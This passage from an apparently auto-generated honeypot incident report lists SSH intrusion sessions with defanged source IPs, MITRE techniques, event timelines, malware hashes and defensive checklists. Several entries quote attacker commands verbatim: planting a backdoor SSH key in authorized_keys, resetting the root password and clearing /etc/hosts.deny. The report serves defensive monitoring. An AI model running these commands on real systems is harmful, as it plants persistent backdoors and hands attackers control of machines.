- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8384e564df2

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:39 |
| **Last Seen** | 2026-04-13 04:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:39:17` | `cowrie.session.connect` |
| `2026-04-13 04:39:17` | `cowrie.client.version` |
| `2026-04-13 04:39:17` | `cowrie.client.kex` |
| `2026-04-13 04:39:19` | `cowrie.login.success` |
| `2026-04-13 04:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fafa002ee2c5

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:39 |
| **Last Seen** | 2026-04-13 04:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:39:34` | `cowrie.session.connect` |
| `2026-04-13 04:39:34` | `cowrie.client.version` |
| `2026-04-13 04:39:34` | `cowrie.client.kex` |
| `2026-04-13 04:39:35` | `cowrie.login.success` |
| `2026-04-13 04:39:35` | `cowrie.session.params` |
| `2026-04-13 04:39:35` | `cowrie.command.input` |
| `2026-04-13 04:39:35` | `cowrie.command.failed` |
| `2026-04-13 04:39:35` | `cowrie.log.closed` |
| `2026-04-13 04:39:36` | `cowrie.session.params` |
| `2026-04-13 04:39:36` | `cowrie.command.input` |
| `2026-04-13 04:39:36` | `cowrie.session.file_download` |
| `2026-04-13 04:39:36` | `cowrie.log.closed` |
| `2026-04-13 04:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61b3a1627609

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:39 |
| **Last Seen** | 2026-04-13 04:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:39:39` | `cowrie.session.connect` |
| `2026-04-13 04:39:39` | `cowrie.client.version` |
| `2026-04-13 04:39:39` | `cowrie.client.kex` |
| `2026-04-13 04:39:39` | `cowrie.login.success` |
| `2026-04-13 04:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8cb6e8b83fa

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]243` |
| **First Seen** | 2026-04-13 04:39 |
| **Last Seen** | 2026-04-13 04:40 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:3gkOeomI7QNo"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:39:51` | `cowrie.session.connect` |
| `2026-04-13 04:39:51` | `cowrie.client.version` |
| `2026-04-13 04:39:51` | `cowrie.client.kex` |
| `2026-04-13 04:39:52` | `cowrie.login.success` |
| `2026-04-13 04:39:52` | `cowrie.session.params` |
| `2026-04-13 04:39:52` | `cowrie.command.input` |
| `2026-04-13 04:39:52` | `cowrie.command.failed` |
| `2026-04-13 04:39:52` | `cowrie.log.closed` |
| `2026-04-13 04:39:54` | `cowrie.session.params` |
| `2026-04-13 04:39:54` | `cowrie.command.input` |
| `2026-04-13 04:39:54` | `cowrie.session.file_download` |
| `2026-04-13 04:39:54` | `cowrie.log.closed` |
| `2026-04-13 04:40:09` | `cowrie.session.params` |
| `2026-04-13 04:40:09` | `cowrie.command.input` |
| `2026-04-13 04:40:10` | `cowrie.log.closed` |
| `2026-04-13 04:40:11` | `cowrie.session.params` |
| `2026-04-13 04:40:11` | `cowrie.command.input` |
| `2026-04-13 04:40:11` | `cowrie.log.closed` |
| `2026-04-13 04:40:13` | `cowrie.session.params` |
| `2026-04-13 04:40:13` | `cowrie.command.input` |
| `2026-04-13 04:40:13` | `cowrie.session.file_download` |
| `2026-04-13 04:40:13` | `cowrie.log.closed` |
| `2026-04-13 04:40:14` | `cowrie.session.params` |
| `2026-04-13 04:40:14` | `cowrie.command.input` |
| `2026-04-13 04:40:14` | `cowrie.log.closed` |
| `2026-04-13 04:40:15` | `cowrie.session.params` |
| `2026-04-13 04:40:15` | `cowrie.command.input` |
| `2026-04-13 04:40:15` | `cowrie.log.closed` |
| `2026-04-13 04:40:16` | `cowrie.session.params` |
| `2026-04-13 04:40:16` | `cowrie.command.input` |
| `2026-04-13 04:40:16` | `cowrie.command.input` |
| `2026-04-13 04:40:16` | `cowrie.log.closed` |
| `2026-04-13 04:40:16` | `cowrie.session.params` |
| `2026-04-13 04:40:16` | `cowrie.command.input` |
| `2026-04-13 04:40:16` | `cowrie.log.closed` |
| `2026-04-13 04:40:17` | `cowrie.session.params` |
| `2026-04-13 04:40:17` | `cowrie.command.input` |
| `2026-04-13 04:40:17` | `cowrie.log.closed` |
| `2026-04-13 04:40:17` | `cowrie.session.params` |
| `2026-04-13 04:40:17` | `cowrie.command.input` |
| `2026-04-13 04:40:18` | `cowrie.log.closed` |
| `2026-04-13 04:40:18` | `cowrie.session.params` |
| `2026-04-13 04:40:18` | `cowrie.command.input` |
| `2026-04-13 04:40:18` | `cowrie.log.closed` |
| `2026-04-13 04:40:19` | `cowrie.session.params` |
| `2026-04-13 04:40:19` | `cowrie.command.input` |
| `2026-04-13 04:40:19` | `cowrie.log.closed` |
| `2026-04-13 04:40:19` | `cowrie.session.params` |
| `2026-04-13 04:40:19` | `cowrie.command.input` |
| `2026-04-13 04:40:20` | `cowrie.log.closed` |
| `2026-04-13 04:40:20` | `cowrie.session.params` |
| `2026-04-13 04:40:20` | `cowrie.command.input` |
| `2026-04-13 04:40:20` | `cowrie.log.closed` |
| `2026-04-13 04:40:21` | `cowrie.session.params` |
| `2026-04-13 04:40:21` | `cowrie.command.input` |
| `2026-04-13 04:40:21` | `cowrie.log.closed` |
| `2026-04-13 04:40:22` | `cowrie.session.params` |
| `2026-04-13 04:40:22` | `cowrie.command.input` |
| `2026-04-13 04:40:22` | `cowrie.log.closed` |
| `2026-04-13 04:40:23` | `cowrie.session.params` |
| `2026-04-13 04:40:23` | `cowrie.command.input` |
| `2026-04-13 04:40:23` | `cowrie.log.closed` |
| `2026-04-13 04:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]243` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccbed3790457

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:40 |
| **Last Seen** | 2026-04-13 04:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:40:47` | `cowrie.session.connect` |
| `2026-04-13 04:40:47` | `cowrie.client.version` |
| `2026-04-13 04:40:48` | `cowrie.client.kex` |
| `2026-04-13 04:40:49` | `cowrie.login.success` |
| `2026-04-13 04:40:49` | `cowrie.session.params` |
| `2026-04-13 04:40:49` | `cowrie.command.input` |
| `2026-04-13 04:40:49` | `cowrie.command.failed` |
| `2026-04-13 04:40:50` | `cowrie.log.closed` |
| `2026-04-13 04:40:50` | `cowrie.session.params` |
| `2026-04-13 04:40:50` | `cowrie.command.input` |
| `2026-04-13 04:40:50` | `cowrie.session.file_download` |
| `2026-04-13 04:40:50` | `cowrie.log.closed` |
| `2026-04-13 04:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046a6fa3803c

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:40 |
| **Last Seen** | 2026-04-13 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:40:54` | `cowrie.session.connect` |
| `2026-04-13 04:40:54` | `cowrie.client.version` |
| `2026-04-13 04:40:54` | `cowrie.client.kex` |
| `2026-04-13 04:40:55` | `cowrie.login.success` |
| `2026-04-13 04:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcce899c96b1

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:41 |
| **Last Seen** | 2026-04-13 04:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:41:11` | `cowrie.session.connect` |
| `2026-04-13 04:41:11` | `cowrie.client.version` |
| `2026-04-13 04:41:11` | `cowrie.client.kex` |
| `2026-04-13 04:41:11` | `cowrie.login.success` |
| `2026-04-13 04:41:12` | `cowrie.session.params` |
| `2026-04-13 04:41:12` | `cowrie.command.input` |
| `2026-04-13 04:41:12` | `cowrie.command.failed` |
| `2026-04-13 04:41:12` | `cowrie.log.closed` |
| `2026-04-13 04:41:12` | `cowrie.session.params` |
| `2026-04-13 04:41:12` | `cowrie.command.input` |
| `2026-04-13 04:41:12` | `cowrie.session.file_download` |
| `2026-04-13 04:41:12` | `cowrie.log.closed` |
| `2026-04-13 04:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f7229acbe0

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:41 |
| **Last Seen** | 2026-04-13 04:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:41:13` | `cowrie.session.connect` |
| `2026-04-13 04:41:13` | `cowrie.client.version` |
| `2026-04-13 04:41:14` | `cowrie.client.kex` |
| `2026-04-13 04:41:14` | `cowrie.login.success` |
| `2026-04-13 04:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc9bd8a17467

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:42 |
| **Last Seen** | 2026-04-13 04:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:42:50` | `cowrie.session.connect` |
| `2026-04-13 04:42:50` | `cowrie.client.version` |
| `2026-04-13 04:42:50` | `cowrie.client.kex` |
| `2026-04-13 04:42:50` | `cowrie.login.success` |
| `2026-04-13 04:42:50` | `cowrie.session.params` |
| `2026-04-13 04:42:50` | `cowrie.command.input` |
| `2026-04-13 04:42:50` | `cowrie.command.failed` |
| `2026-04-13 04:42:50` | `cowrie.log.closed` |
| `2026-04-13 04:42:51` | `cowrie.session.params` |
| `2026-04-13 04:42:51` | `cowrie.command.input` |
| `2026-04-13 04:42:51` | `cowrie.session.file_download` |
| `2026-04-13 04:42:51` | `cowrie.log.closed` |
| `2026-04-13 04:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0a290933b35

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:42 |
| **Last Seen** | 2026-04-13 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:42:52` | `cowrie.session.connect` |
| `2026-04-13 04:42:52` | `cowrie.client.version` |
| `2026-04-13 04:42:52` | `cowrie.client.kex` |
| `2026-04-13 04:42:53` | `cowrie.login.success` |
| `2026-04-13 04:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-818e38313694

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]243` |
| **First Seen** | 2026-04-13 04:43 |
| **Last Seen** | 2026-04-13 04:43 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jc9KEhIDLiq2"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:43:20` | `cowrie.session.connect` |
| `2026-04-13 04:43:20` | `cowrie.client.version` |
| `2026-04-13 04:43:20` | `cowrie.client.kex` |
| `2026-04-13 04:43:21` | `cowrie.login.success` |
| `2026-04-13 04:43:22` | `cowrie.session.params` |
| `2026-04-13 04:43:22` | `cowrie.command.input` |
| `2026-04-13 04:43:22` | `cowrie.command.failed` |
| `2026-04-13 04:43:22` | `cowrie.log.closed` |
| `2026-04-13 04:43:22` | `cowrie.session.params` |
| `2026-04-13 04:43:22` | `cowrie.command.input` |
| `2026-04-13 04:43:22` | `cowrie.session.file_download` |
| `2026-04-13 04:43:22` | `cowrie.log.closed` |
| `2026-04-13 04:43:33` | `cowrie.session.params` |
| `2026-04-13 04:43:33` | `cowrie.command.input` |
| `2026-04-13 04:43:34` | `cowrie.log.closed` |
| `2026-04-13 04:43:34` | `cowrie.session.params` |
| `2026-04-13 04:43:34` | `cowrie.command.input` |
| `2026-04-13 04:43:35` | `cowrie.log.closed` |
| `2026-04-13 04:43:35` | `cowrie.session.params` |
| `2026-04-13 04:43:35` | `cowrie.command.input` |
| `2026-04-13 04:43:36` | `cowrie.session.file_download` |
| `2026-04-13 04:43:36` | `cowrie.log.closed` |
| `2026-04-13 04:43:36` | `cowrie.session.params` |
| `2026-04-13 04:43:36` | `cowrie.command.input` |
| `2026-04-13 04:43:36` | `cowrie.log.closed` |
| `2026-04-13 04:43:37` | `cowrie.session.params` |
| `2026-04-13 04:43:37` | `cowrie.command.input` |
| `2026-04-13 04:43:38` | `cowrie.log.closed` |
| `2026-04-13 04:43:38` | `cowrie.session.params` |
| `2026-04-13 04:43:38` | `cowrie.command.input` |
| `2026-04-13 04:43:38` | `cowrie.command.input` |
| `2026-04-13 04:43:39` | `cowrie.log.closed` |
| `2026-04-13 04:43:40` | `cowrie.session.params` |
| `2026-04-13 04:43:40` | `cowrie.command.input` |
| `2026-04-13 04:43:40` | `cowrie.log.closed` |
| `2026-04-13 04:43:40` | `cowrie.session.params` |
| `2026-04-13 04:43:40` | `cowrie.command.input` |
| `2026-04-13 04:43:41` | `cowrie.log.closed` |
| `2026-04-13 04:43:41` | `cowrie.session.params` |
| `2026-04-13 04:43:41` | `cowrie.command.input` |
| `2026-04-13 04:43:41` | `cowrie.log.closed` |
| `2026-04-13 04:43:42` | `cowrie.session.params` |
| `2026-04-13 04:43:42` | `cowrie.command.input` |
| `2026-04-13 04:43:42` | `cowrie.log.closed` |
| `2026-04-13 04:43:42` | `cowrie.session.params` |
| `2026-04-13 04:43:42` | `cowrie.command.input` |
| `2026-04-13 04:43:43` | `cowrie.log.closed` |
| `2026-04-13 04:43:43` | `cowrie.session.params` |
| `2026-04-13 04:43:43` | `cowrie.command.input` |
| `2026-04-13 04:43:43` | `cowrie.log.closed` |
| `2026-04-13 04:43:44` | `cowrie.session.params` |
| `2026-04-13 04:43:44` | `cowrie.command.input` |
| `2026-04-13 04:43:44` | `cowrie.log.closed` |
| `2026-04-13 04:43:44` | `cowrie.session.params` |
| `2026-04-13 04:43:44` | `cowrie.command.input` |
| `2026-04-13 04:43:45` | `cowrie.log.closed` |
| `2026-04-13 04:43:45` | `cowrie.session.params` |
| `2026-04-13 04:43:45` | `cowrie.command.input` |
| `2026-04-13 04:43:45` | `cowrie.log.closed` |
| `2026-04-13 04:43:47` | `cowrie.session.params` |
| `2026-04-13 04:43:47` | `cowrie.command.input` |
| `2026-04-13 04:43:47` | `cowrie.log.closed` |
| `2026-04-13 04:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]243` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a733d6bfd9

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:46 |
| **Last Seen** | 2026-04-13 04:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:46:53` | `cowrie.session.connect` |
| `2026-04-13 04:46:53` | `cowrie.client.version` |
| `2026-04-13 04:46:53` | `cowrie.client.kex` |
| `2026-04-13 04:46:54` | `cowrie.login.success` |
| `2026-04-13 04:46:55` | `cowrie.session.params` |
| `2026-04-13 04:46:55` | `cowrie.command.input` |
| `2026-04-13 04:46:55` | `cowrie.command.failed` |
| `2026-04-13 04:46:55` | `cowrie.log.closed` |
| `2026-04-13 04:46:56` | `cowrie.session.params` |
| `2026-04-13 04:46:56` | `cowrie.command.input` |
| `2026-04-13 04:46:56` | `cowrie.session.file_download` |
| `2026-04-13 04:46:56` | `cowrie.log.closed` |
| `2026-04-13 04:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43ab7ab45bc

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:46 |
| **Last Seen** | 2026-04-13 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
